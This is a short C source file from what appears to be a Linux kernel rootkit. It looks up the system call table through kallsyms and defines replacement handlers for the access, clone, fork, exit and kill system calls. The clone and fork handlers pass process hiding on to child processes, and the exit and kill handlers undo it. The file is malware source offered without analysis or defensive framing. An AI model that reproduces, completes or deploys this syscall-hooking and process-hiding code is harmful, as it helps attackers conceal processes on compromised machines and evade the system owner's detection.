#include "syscalls.h"

unsigned long *find_syscall_table(void)
{
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}

asmlinkage long rk_access(const struct pt_regs *pt_regs)
{
    const char __user *filename = (const char __user *)pt_regs->di;
    int mode = (int)pt_regs->si;
    // pr_info("Access: %s\n", filename);
    return orig_access(pt_regs);
}

asmlinkage long rk_clone(unsigned long a, unsigned long b, int __user *c, unsigned long d, int __user *e)
{
    long i = orig_clone(a, b, c, d, e);
    if (is_hidden_proc(current->pid)) hide_proc(i);
    pr_info("clone from %d to %ld\n", current->pid, i);
    return i;
}

asmlinkage long rk_fork(void) {
    long i = orig_fork();
    if (is_hidden_proc(current->pid)) hide_proc(i);
    pr_info("fork from %d to %ld\n", current->pid, i);
    return i;
}

asmlinkage long rk_exit(int error_code) {
    pr_info("exit from %d code %d\n", current->pid, error_code);
    unhide_proc(current->pid);
    return orig_exit(error_code);
}

asmlinkage long rk_kill(const struct pt_regs *pt_regs) {
    long i = orig_kill(pt_regs);
    pr_info("kill %ld code %ld", pt_regs->di, pt_regs->si);
    if (i == 0) unhide_proc(pt_regs->di);
    return i;
}
